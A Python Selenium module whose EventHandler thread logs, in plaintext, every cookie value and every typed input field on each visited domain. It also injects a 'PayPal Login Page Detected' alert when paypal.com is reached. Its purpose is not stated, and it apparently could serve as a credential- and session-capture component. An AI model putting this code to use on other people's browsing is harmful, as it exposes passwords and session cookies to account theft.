from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException
import logging
import threading
import time

class EventHandler:
    def __init__(self, browser):
        self.browser = browser
        self.active = True
        self.current_domain = ""
        self.logger = logging.getLogger("EventHandler")
        self.cookies = {}
        self.last_input_values = {}
        self.domain_alerts = {}

    def start(self):
        self.thread = threading.Thread(target=self.monitor_events)
        self.thread.daemon = True
        self.thread.start()

    def monitor_events(self):
        while self.active:
            try:
                if self._handle_alert():
                    continue
                self._handle_tab_switch()
                self._monitor_domain_changes()
                time.sleep(0.1)
            except WebDriverException as e:
                if "alert" in str(e).lower():
                    self._handle_alert()
                else:
                    self.logger.error(f"Browser error: {e}")

    def stop(self):
        self.active = False
        if hasattr(self, 'thread'):
            self.thread.join()

    def _handle_tab_switch(self):
        """Handle switching between browser tabs"""
        try:
            current_active_tab = self.browser.driver.window_handles[-1]
            try:
                current_window_handle = self.browser.driver.current_window_handle
            except:
                current_window_handle = None
            
            if current_active_tab != current_window_handle:
                self.browser.driver.switch_to.window(current_active_tab)
        except WebDriverException as e:
            self.logger.error(f"Tab switch error: {e}")

    def _handle_alert(self):
        """Handle any browser alerts"""
        try:
            alert = self.browser.driver.switch_to.alert
            alert_text = alert.text
            self.logger.info(f"Alert present: {alert_text}")
            alert.accept()
            return True
        except:
            return False

    def _monitor_domain_changes(self):
        """Monitor changes in the current domain"""
        try:
            if self._handle_alert():
                return

            current_url = self.browser.driver.current_url
            current_domain = current_url.split("://")[-1].split("/")[0]
            
            if current_domain != self.current_domain:
                self.current_domain = current_domain
                self.logger.info(f"Domain changed to: {self.current_domain}")
                self.last_input_values = {}
                
            if current_url in ["about:blank", "about:srcdoc", ""]:
                return

            self._monitor_cookies()
            self._monitor_inputs()
            self._check_domain_alerts()
                
        except WebDriverException as e:
            if "alert" in str(e).lower():
                self._handle_alert()
            else:
                self.logger.error(f"Domain monitoring error: {e}")

    def _monitor_cookies(self):
        """Monitor cookie changes for the current domain"""
        try:
            current_cookies = {
                cookie['name']: cookie['value'] 
                for cookie in self.browser.driver.get_cookies()
                if self.current_domain in cookie['domain']
            }
            
            for name, value in current_cookies.items():
                if (self.current_domain not in self.cookies or 
                    name not in self.cookies.get(self.current_domain, {}) or 
                    self.cookies.get(self.current_domain, {}).get(name) != value):
                    self.logger.info(f"Cookie changed - {name}: {value}")
            
            self.cookies[self.current_domain] = current_cookies
            
        except WebDriverException as e:
            self.logger.error(f"Cookie monitoring error: {e}")

    def _monitor_inputs(self):
        """Monitor input field changes"""
        try:
            current_inputs = {
                element.get_attribute('name'): element.get_attribute('value')
                for element in self.browser.driver.find_elements(By.TAG_NAME, 'input')
                if element.get_attribute('name')
            }
            
            for name, value in current_inputs.items():
                if (name not in self.last_input_values or 
                    self.last_input_values[name] != value) and value:
                    self.logger.info(f"Input changed - {name}: {value}")
            
            self.last_input_values = current_inputs
            
        except WebDriverException as e:
            self.logger.error(f"Input monitoring error: {e}")

    def _check_domain_alerts(self):
        """Check and execute domain-specific alerts"""
        try:
            if "paypal.com" in self.current_domain and self.current_domain not in self.domain_alerts:
                self.domain_alerts[self.current_domain] = True
                self.logger.warning(f"Alert triggered for domain: {self.current_domain}")
                self.browser.driver.execute_script("""
                    setTimeout(function() {
                        alert('PayPal Login Page Detected');
                    }, 500);
                """)
        except WebDriverException as e:
            self.logger.error(f"Domain alert error: {e}")

class InputHandler:
    def __init__(self, browser):
        self.browser = browser
        self.logger = logging.getLogger("InputHandler")
        self.cookies = {}

    def get_input_fields(self):
        try:
            input_elements = self.browser.driver.find_elements(By.TAG_NAME, 'input')
            return {
                element.get_attribute('name'): element.get_attribute('value')
                for element in input_elements
            }
        except WebDriverException as e:
            self.logger.error(f"Failed to get input fields: {e}")
            return {}
